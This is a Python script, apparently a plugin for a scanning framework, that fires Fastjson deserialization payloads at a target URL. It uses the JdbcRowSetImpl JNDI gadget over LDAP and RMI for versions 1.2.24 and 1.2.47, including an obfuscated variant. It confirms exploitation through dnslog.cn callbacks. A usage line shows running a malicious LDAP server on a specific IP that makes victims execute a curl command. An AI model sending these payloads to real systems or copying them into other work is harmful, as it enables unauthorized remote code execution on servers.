import requests,time,re,sys
###测试
sys.path.append('../')
from ClassCongregation import Dnslog
#import ClassCongregation
def check(**kwargs):
    url = kwargs['url']
    #VPSip
    Vurl = kwargs['ip']
    #VPSport
    port = kwargs['port']

    dns_cookie = kwargs['cookie']
    head = {
        "Content-Type":"application/json",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"    
    }

    header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'}
    payload_ldap = {
    "1.2.24":"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://"+ Vurl+":"+port +"/Object\",\"autoCommit\":true}",
    "1.2.24_1":"{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://"+ Vurl+":"+port +":10086/Object\",\"autoCommit\":true}}",
    "1.2.47":"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://"+ Vurl+":"+port +"/Object\",\"autoCommit\":true}}}",
    "1.2.24_2":"{\"fybm3i\": {\"\\u0040type\": \"\\x63o\\u006D\\u002Es\\x75n.\\u0072ows\\u0065\\u0074.Jdbc\\x52\\x6F\\u0077\\x53e\\u0074\\u0049m\\x70l\",\"dataSourceName\": \"ldap://"+ Vurl+":"+port +"/Object\",\"autoCommit\": true}}"
}

    payload_rmi = {
    "1.2.24":"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://"+ Vurl+":"+port +"/Object\",\"autoCommit\":true}",
    "1.2.24_1":"{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://"+ Vurl+":"+port +":10086/Object\",\"autoCommit\":true}}",
    "1.2.47":"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://"+ Vurl+":"+port +"/Object\",\"autoCommit\":true}}}",
    "1.2.24_2":"{\"fybm3i\": {\"\\u0040type\": \"\\x63o\\u006D\\u002Es\\x75n.\\u0072ows\\u0065\\u0074.Jdbc\\x52\\x6F\\u0077\\x53e\\u0074\\u0049m\\x70l\",\"dataSourceName\": \"rmi://"+ Vurl+":"+port +"/Object\",\"autoCommit\": true}}"
}

    payload_other = {
        "1":"{\"zeo\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"nnivq5.dnslog.cn\"}}"
    }
    try:
        print('[*]正在利用LDAP测试...')
        for poc in payload_ldap:
            requests.post(url, headers=head, data=payload_ldap[poc], timeout=15, verify=False)
            time.sleep(0.5)
            rep1 = requests.get('http://dnslog.cn/getrecords.php', cookies={'PHPSESSID': dns_cookie} , headers=header, timeout=15)

            if 'dnslog' in rep1.text:
                print('[+]target is vulnerable')
                print('[+]fastjson version:{}'.format(poc))
                print('[+]poc:{}'.format(payload_ldap[poc]))
                return
        time.sleep(0.5)
        print('[*]正在利用RMI测试...')
        for poc in payload_rmi:
            requests.post(url, headers=head, data=payload_rmi[poc], timeout=15, verify=False)
            time.sleep(0.5)
            rep1 = requests.get('http://dnslog.cn/getrecords.php', cookies={'PHPSESSID': dns_cookie} , headers=header, timeout=15)
            if 'dnslog' in rep1.text:
                print('[+]target is vulnerable')
                print('[+]fastjson version:{}'.format(poc))
                print('[+]poc:{}'.format(payload_rmi[poc]))
                return
        print('[-]target is not vulnerable, or openjdk > 8u102')
    except Exception as e:
        print("异常对象的内容是%s"%e)

print("[*]用法：java -cp fastjson_tool.jar fastjson.HLDAPServer 106.12.132.186 10086 \"curl xxx.dnslog.cn\"")
print("[*]用法：cookie中要输入dnslog网站的PHPSESSID")


if __name__ == "__main__":
    DL=Dnslog()
    a = DL.dns_host()
    print(a)
    if DL.dnslog_cn_dns():
        print('good')
